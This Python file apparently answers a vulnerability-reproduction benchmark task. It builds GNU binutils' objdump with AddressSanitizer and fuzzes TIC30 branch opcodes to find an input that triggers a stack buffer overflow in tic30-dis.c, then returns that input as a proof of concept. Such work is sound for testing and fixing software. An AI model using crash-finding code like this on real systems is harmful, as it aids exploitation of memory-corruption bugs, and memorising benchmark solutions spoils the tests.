import os
import sys
import tarfile
import subprocess
import tempfile
import re
import struct
import shutil
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in tic30-dis.c.
        """
        work_dir = tempfile.mkdtemp()
        extract_dir = os.path.join(work_dir, "extract")
        build_dir = os.path.join(work_dir, "build")
        
        try:
            # 1. Extract the source code
            os.makedirs(extract_dir, exist_ok=True)
            with tarfile.open(src_path) as tar:
                tar.extractall(extract_dir)
            
            # Locate source root
            src_root = extract_dir
            entries = os.listdir(extract_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(extract_dir, entries[0])):
                src_root = os.path.join(extract_dir, entries[0])
            
            # 2. Analyze tic30-dis.c to find opcodes using print_branch
            candidates = []
            tic30_dis_path = None
            for root, dirs, files in os.walk(src_root):
                if "tic30-dis.c" in files:
                    tic30_dis_path = os.path.join(root, "tic30-dis.c")
                    break
            
            if tic30_dis_path:
                with open(tic30_dis_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    # Regex matches: { "mnemonic", opcode, mask, print_branch, ... }
                    pattern = re.compile(r'\{\s*"[^"]+"\s*,\s*(0x[0-9a-fA-F]+)\s*,\s*(0x[0-9a-fA-F]+)\s*,\s*print_branch')
                    matches = pattern.findall(content)
                    for op_str, mask_str in matches:
                        candidates.append((int(op_str, 16), int(mask_str, 16)))
            
            # Fallback if parsing fails (BR instruction)
            if not candidates:
                candidates.append((0x60000000, 0xFF000000))
            
            # 3. Configure and Build binutils (objdump)
            os.makedirs(build_dir, exist_ok=True)
            env = os.environ.copy()
            # Use ASAN to detect the stack overflow
            env['CFLAGS'] = "-g -O0 -fsanitize=address"
            env['LDFLAGS'] = "-fsanitize=address"
            env['MAKEINFO'] = "true" 
            
            configure_script = os.path.abspath(os.path.join(src_root, "configure"))
            
            # Configure for TIC30 target
            subprocess.check_call([
                configure_script,
                "--target=tic30-unknown-coff",
                "--disable-nls",
                "--disable-werror",
                "--disable-gdb",
                "--disable-sim",
                "--disable-readline",
                "--disable-libdecnumber",
                "--disable-gas",
                "--disable-ld"
            ], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Build objdump
            subprocess.check_call(["make", "-j8", "all-binutils"], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Locate objdump binary
            objdump_bin = os.path.join(build_dir, "binutils", "objdump")
            if not os.path.exists(objdump_bin):
                for r, d, f in os.walk(build_dir):
                    if "objdump" in f:
                        cand = os.path.join(r, "objdump")
                        if os.access(cand, os.X_OK):
                            objdump_bin = cand
                            break

            # 4. Fuzzing Loop
            fuzz_file = os.path.join(work_dir, "fuzz.bin")
            
            # Try Big Endian first (TIC30 is usually BE)
            # We vary the operand bits (bits not covered by the mask)
            for endian in ['>I', '<I']:
                for opcode, mask in candidates:
                    var_mask = (~mask) & 0xFFFFFFFF
                    
                    # Batch fuzzing for speed
                    batch_size = 50
                    num_batches = 500
                    
                    for _ in range(num_batches):
                        batch_bytes = []
                        for _ in range(batch_size):
                            r = random.getrandbits(32)
                            inst = opcode | (r & var_mask)
                            batch_bytes.append(struct.pack(endian, inst))
                        
                        data = b''.join(batch_bytes)
                        with open(fuzz_file, 'wb') as f:
                            f.write(data)
                        
                        # Run objdump with binary input mode forced to TIC30
                        proc = subprocess.run(
                            [objdump_bin, "-D", "-b", "binary", "-m", "tic30", fuzz_file],
                            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, env=env
                        )
                        
                        if proc.returncode != 0:
                            err = proc.stderr.decode(errors='ignore')
                            if "AddressSanitizer" in err or "stack-buffer-overflow" in err:
                                # Isolate the crashing input
                                for b in batch_bytes:
                                    with open(fuzz_file, 'wb') as f:
                                        f.write(b)
                                    p = subprocess.run(
                                        [objdump_bin, "-D", "-b", "binary", "-m", "tic30", fuzz_file],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, env=env
                                    )
                                    if p.returncode != 0:
                                        return b
            
            # If no crash found, return a generic guess (unlikely to work without specific fuzzing hit)
            return b'\x00' * 4
            
        except Exception:
            return b'\x00' * 4
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)